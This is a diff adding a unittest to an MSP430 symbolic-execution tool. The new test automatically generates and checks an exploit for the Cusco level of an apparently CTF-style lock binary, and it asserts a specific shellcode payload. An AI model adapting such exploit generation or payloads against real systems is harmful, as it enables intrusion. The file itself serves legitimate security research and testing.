@@ -1,6 +1,7 @@
 import unittest
 
 from msp430_symex.state import start_path_group
+from msp430_symex.exploit import generate_exploit
 
 class TestTutorial(unittest.TestCase):
     def test_tutorial(self):
@@ -303,6 +304,67 @@ fff0:   5644 5644 5644 5644 5644 5644 5644 0044   VDVDVDVDVDVDVD.D"""
         winning_input = winning_inputs[0].rstrip(b'\xc0')
 
         self.assertEqual(winning_input, b'\xbd\xf3')
+
+class TestCusco(unittest.TestCase):
+
+    def test_cusco(self):
+        dump = \
+"""0000:   0000 4400 0000 0000 0000 0000 0000 0000   ..D.............
+0010:   *
+4400:   3140 0044 1542 5c01 75f3 35d0 085a 3f40   1@.D.B\.u.5..Z?@
+4410:   0000 0f93 0724 8245 5c01 2f83 9f4f d445   .....$.E\./..O.E
+4420:   0024 f923 3f40 0000 0f93 0624 8245 5c01   .$.#?@.....$.E\.
+4430:   1f83 cf43 0024 fa23 b012 0045 32d0 f000   ...C.$.#...E2...
+4440:   fd3f 3040 d245 3012 7f00 b012 4245 2153   .?0@.E0...BE!S
+4450:   3041 0412 0441 2453 2183 c443 fcff 3e40   0A...A$S!..C..>@
+4460:   fcff 0e54 0e12 0f12 3012 7d00 b012 4245   ...T....0.}...BE
+4470:   5f44 fcff 8f11 3152 3441 3041 456e 7465   _D....1R4A0AEnte
+4480:   7220 7468 6520 7061 7373 776f 7264 2074   r the password t
+4490:   6f20 636f 6e74 696e 7565 2e00 5265 6d65   o continue..Reme
+44a0:   6d62 6572 3a20 7061 7373 776f 7264 7320   mber: passwords 
+44b0:   6172 6520 6265 7477 6565 6e20 3820 616e   are between 8 an
+44c0:   6420 3136 2063 6861 7261 6374 6572 732e   d 16 characters.
+44d0:   0041 6363 6573 7320 6772 616e 7465 642e   .Access granted.
+44e0:   0054 6861 7420 7061 7373 776f 7264 2069   .That password i
+44f0:   7320 6e6f 7420 636f 7272 6563 742e 0000   s not correct...
+4500:   3150 f0ff 3f40 7c44 b012 a645 3f40 9c44   1P..?@|D...E?@.D
+4510:   b012 a645 3e40 3000 0f41 b012 9645 0f41   ...E>@0..A...E.A
+4520:   b012 5244 0f93 0524 b012 4644 3f40 d144   ..RD...$..FD?@.D
+4530:   023c 3f40 e144 b012 a645 3150 1000 3041   .<?@.D...E1P..0A
+4540:   3041 1e41 0200 0212 0f4e 8f10 024f 32d0   0A.A.....N...O2.
+4550:   0080 b012 1000 3241 3041 2183 0f12 0312   ......2A0A!.....
+4560:   814f 0400 b012 4245 1f41 0400 3150 0600   .O....BE.A..1P..
+4570:   3041 0412 0441 2453 2183 3f40 fcff 0f54   0A...A$S!.?@...T
+4580:   0f12 1312 b012 4245 5f44 fcff 8f11 3150   ......BE_D....1P
+4590:   0600 3441 3041 0e12 0f12 2312 b012 4245   ..4A0A....#...BE
+45a0:   3150 0600 3041 0b12 0b4f 073c 1b53 8f11   1P..0A...O.<.S..
+45b0:   0f12 0312 b012 4245 2152 6f4b 4f93 f623   ......BE!RoKO..#
+45c0:   3012 0a00 0312 b012 4245 2152 0f43 3b41   0.......BE!R.C;A
+45d0:   3041 0013 0000 0000 0000 0000 0000 0000   0A..............
+45e0:   *
+ff80:   4244 4244 4244 4244 4244 4244 4244 4244   BDBDBDBDBDBDBDBD
+ff90:   4244 4244 4244 4244 4244 4244 4244 4244   BDBDBDBDBDBDBDBD
+ffa0:   4244 4244 4244 4244 4244 4244 4244 4244   BDBDBDBDBDBDBDBD
+ffb0:   4244 4244 4244 4244 4244 4244 4244 4244   BDBDBDBDBDBDBDBD
+ffc0:   4244 4244 4244 4244 4244 4244 4244 4244   BDBDBDBDBDBDBDBD
+ffd0:   4244 4244 4244 4244 4244 4244 4244 4244   BDBDBDBDBDBDBDBD
+ffe0:   4244 4244 4244 4244 4244 4244 4244 4244   BDBDBDBDBDBDBDBD
+fff0:   4244 4244 4244 4244 4244 4244 4244 0044   BDBDBDBDBDBDBD.D"""
+        #TODO: automatically find avoid address via CFG
+        pg = start_path_group(dump, 0x4400, avoid=0x443c)
+
+        pg.step_until_symbolic_ip()
+
+        self.assertEqual(len(pg.symbolic), 1)
+
+        sym_state = list(pg.symbolic)[0]
+
+        sym_state = generate_exploit(sym_state)
+        winning_input = sym_state.sym_input.dump(sym_state)[0].rstrip(b'\xc0')
+
+        # TODO: validate exploitability by stepping until unlocked instead of checking strings
+        exploit_str = b'\x7fC\x8f\x10\x02O3\x12~@\x10\xff\x8e\x12\xc0\xc0\xeeC'
+        self.assertEqual(winning_input, exploit_str)
 
 if __name__ == '__main__':
     unittest.main()
